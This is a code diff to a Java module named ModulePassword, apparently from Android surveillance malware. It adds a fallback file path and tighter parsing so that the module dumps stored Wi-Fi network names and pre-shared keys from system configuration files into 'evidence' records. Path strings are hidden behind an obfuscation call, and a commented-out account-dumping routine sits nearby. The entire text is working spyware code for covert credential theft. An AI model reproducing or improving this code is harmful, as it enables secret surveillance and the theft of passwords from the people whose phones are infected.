@@ -115,13 +115,18 @@ public class ModulePassword extends BaseModule {
 			}
 		};
 
-		dumpWifi();
+		String filename_v4 = M.e("/data/misc/wifi/wpa_supplicant.conf");
+		String filename_v2 = M.e("/data/wifi/bcm_supp.conf");
+		if (!dumpWifi(filename_v4)){
+			dumpWifi(filename_v2);
+		}
+			
 		// dumpAccounts(passwordVisitor);
 
 	}
 
-	private void dumpWifi() {
-		String filename = M.e("/data/misc/wifi/wpa_supplicant.conf");
+	private boolean dumpWifi(String filename) {
+		
 		if (Cfg.DEBUG) {
 			File file = new File(filename);
 			Check.log(TAG + " (dumpWifi) can read: " + file.canRead());
@@ -134,14 +139,14 @@ public class ModulePassword extends BaseModule {
 				File file = new File(filename);
 				Check.log(TAG + " (dumpWifi) can read: " + file.canRead());
 			}
-			return;
+			return false;
 		}
 		List<String> lines = StringUtils.readFileLines(filename);
 		String ssid = "";
 		String psk = "";
 		EvidenceBuilder evidence = new EvidenceBuilder(EvidenceType.PASSWORD);
 		for (String line : lines) {
-			if (line.contains("ssid")) {
+			if (line.contains("ssid") && !line.contains("scan_ssid")) {
 				ssid = getValue(line);
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (dumpWifi) ssid = %s", ssid);
@@ -155,6 +160,7 @@ public class ModulePassword extends BaseModule {
 			}
 		}
 		evidence.close();
+		return true;
 
 	}
 
